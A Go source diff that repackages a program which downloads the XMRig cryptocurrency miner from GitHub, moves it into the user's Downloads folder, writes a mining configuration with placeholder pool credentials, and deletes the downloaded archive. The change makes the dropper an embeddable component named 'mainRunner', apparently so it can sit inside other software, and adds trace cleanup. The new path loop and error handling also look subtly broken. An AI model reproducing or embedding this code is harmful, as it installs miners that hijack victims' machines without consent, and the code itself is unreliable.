@@ -1,4 +1,4 @@
-package main
+package components
 
 import (
 	"fmt"
@@ -14,7 +14,7 @@ import (
 
 
 
-func main() {
+func mainRunner() {
 	fileName := "red.zip"
     URL := "https://github.com/xmrig/xmrig/releases/download/v6.3.3/xmrig-6.3.3-msvc-win64.zip"
     err := downloadFile(URL, fileName)
@@ -40,13 +40,18 @@ func mvToLoc() {
 	}
 
 	var sg string
-	var tocut int
+    var tocut int
+    var numOcc int
 
-	tocut = strings.LastIndex(outputFolder, "\\")
-	sg = outputFolder[:tocut]
+
+    numOcc = strings.Count(outputFolder, "\\")
+    sg = outputFolder
+    for i := 1; i < numOcc - 1; i++ { 
+        tocut = strings.LastIndex(sg, "\\")
+        sg = outputFolder[:tocut]
+        fmt.Println("path: ", sg)
+    }
 	
-	tocut = strings.LastIndex(sg, "\\")
-	sg = outputFolder[:tocut]
 
 	mvdir := sg + "\\Downloads\\"  + "output"
 	er := os.Rename(outputFolder + "\\output", mvdir)
@@ -55,7 +60,12 @@ func mvToLoc() {
 	}
 
 	configPath := mvdir + "\\xmrig-6.3.3\\config.json"
-	configure_xmrig(configPath, "example.com", "user", "pass")
+    configure_xmrig(configPath, "example.com", "user", "pass")
+    
+    r := os.Remove("red.zip")
+    if r != nil { 
+        log.Fatal(err)
+    }
 
 }
 
